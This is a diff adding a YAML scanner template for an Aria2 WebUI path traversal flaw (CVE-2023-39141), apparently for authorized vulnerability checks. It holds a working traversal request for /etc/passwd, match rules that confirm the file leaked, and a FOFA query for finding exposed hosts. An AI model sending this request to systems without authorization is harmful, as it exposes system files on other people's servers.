@@ -1,0 +1,23 @@
+id: poc-yaml-aria2-webui-path-traversal
+info:
+  name: Aria2 WebUI 路径遍历漏洞(CVE-2023-39141)
+  severity: medium
+  tags:
+  - CVE-2023-39141
+  - 路径遍历
+  finger: aria2 webui
+  fofa: title="Aria2 WebUI"
+requests:
+- method: GET
+  path: /../../../../etc/passwd
+  expression: 'status_code == 200
+
+    && contains(body,"root:")
+
+    && contains(body,"/bin")
+
+    && !contains(body,"<")
+
+    '
+variables: {}
+transport: http
